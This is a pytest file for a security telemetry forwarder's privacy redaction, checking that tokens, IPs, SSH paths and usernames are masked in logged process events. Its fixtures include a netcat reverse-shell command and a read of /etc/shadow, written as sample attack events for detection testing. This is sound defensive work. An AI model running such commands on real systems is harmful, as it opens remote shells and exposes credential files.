"""
Tests for Privacy Redaction (Section 8)

Validates:
- Sensitive fields (tokens, credentials, IPs, paths, usernames) are redacted
- Non-sensitive behavioral evidence (binary name, pid, system users) is retained
- Privacy metadata records all redacted fields
- Secret-like values do not appear in logging summaries
- Redaction is applied before output/persistence
- Disabled redaction mode operates as an explicit policy
"""

import pytest

from forwarder.config import Config
from forwarder.redaction import EventRedactor, sanitize_for_logging
from forwarder.transformer import transform_event


def test_sensitive_ip_and_token_redacted():
    """Verify IP addresses and secret tokens in process arguments are redacted."""
    raw = {
        "process_exec": {
            "process": {
                "pid": 4830,
                "uid": 0,
                "binary": "/bin/nc",
                "arguments": "-e /bin/sh 192.168.1.100 4444 token=secret_token_123456",
                "cwd": "/tmp",
                "pod": {"name": "app-pod", "namespace": "default"},
            }
        },
        "time": "2026-03-01T00:00:00Z",
    }
    cfg = Config()
    cfg.PRIVACY_REDACTION_ENABLED = True

    event = transform_event(raw, config=cfg)
    assert event is not None

    privacy = event["privacy"]
    assert privacy["enabled"] is True
    assert privacy["redacted"] is True
    assert "args" in privacy["redacted_fields"]

    args = event["telemetry"]["args"]
    # Check that raw IP and raw secret do not appear
    assert "192.168.1.100" not in args
    assert "192.168.1.xxx" in args
    assert "secret_token_123456" not in " ".join(args)
    # Check that behavioral flag "-e" is retained
    assert "-e" in args
    assert "/bin/sh" in args


def test_sensitive_path_and_non_system_user_redacted():
    """Verify sensitive file paths and non-system usernames are redacted."""
    raw = {
        "process_exec": {
            "process": {
                "pid": 2000,
                "uid": 1000,
                "binary": "/usr/bin/cat",
                "arguments": "/etc/shadow",
                "cwd": "/root/.ssh",
            }
        },
        "time": "2026-03-01T00:00:00Z",
    }
    event = transform_event(raw)
    assert event is not None

    telemetry = event["telemetry"]
    # User 1000 ("user") should be redacted
    assert telemetry["user"] == "[REDACTED_USER]"
    # Sensitive cwd should be masked
    assert "/root/.ssh" not in telemetry["cwd"]
    assert "[REDACTED_SSH_KEY_PATH]" in telemetry["cwd"]

    assert "user" in event["privacy"]["redacted_fields"]
    assert "cwd" in event["privacy"]["redacted_fields"]


def test_system_user_and_binary_retained():
    """Verify system users (root, www-data) and binaries are retained for detection rules."""
    raw = {
        "process_exec": {
            "process": {
                "pid": 100,
                "uid": 0,
                "binary": "/usr/bin/curl",
                "arguments": "-s https://example.com",
            }
        },
        "time": "2026-03-01T00:00:00Z",
    }
    event = transform_event(raw)
    assert event is not None

    # System user "root" must be preserved for threat rules
    assert event["telemetry"]["user"] == "root"
    assert event["telemetry"]["binary"] == "/usr/bin/curl"
    assert event["telemetry"]["pid"] == 100


def test_disabled_redaction_explicit_choice():
    """Verify that disabling redaction produces explicit disabled privacy metadata."""
    cfg = Config()
    cfg.PRIVACY_REDACTION_ENABLED = False

    raw = {
        "process_exec": {
            "process": {
                "pid": 100,
                "uid": 1000,
                "binary": "/bin/bash",
                "arguments": "--token=unredacted_raw_secret",
            }
        },
        "time": "2026-03-01T00:00:00Z",
    }
    event = transform_event(raw, config=cfg)
    assert event is not None

    privacy = event["privacy"]
    assert privacy["enabled"] is False
    assert privacy["redacted"] is False
    assert privacy["policy"] == "disabled"
    assert "--token=unredacted_raw_secret" in event["telemetry"]["args"]


def test_sanitize_for_logging_removes_payload():
    """Verify structured log helper outputs minimal, secret-free metadata."""
    event = {
        "event_id": "test-uuid-1234",
        "timestamp": "2026-03-01T00:00:00Z",
        "event_type": "process_exec",
        "capture_mode": "fixture_replay",
        "telemetry": {
            "binary": "/bin/sh",
            "pid": 1234,
            "user": "root",
            "pod": "worker-pod",
            "args": ["very", "sensitive", "raw", "args", "bearer 1234567890abcdef"],
        },
        "privacy": {"redacted": True},
    }
    safe_log = sanitize_for_logging(event)
    assert safe_log["event_id"] == "test-uuid-1234"
    assert safe_log["binary"] == "/bin/sh"
    # Arguments and payload must not be in the log dict
    assert "args" not in safe_log
    assert "bearer" not in str(safe_log)
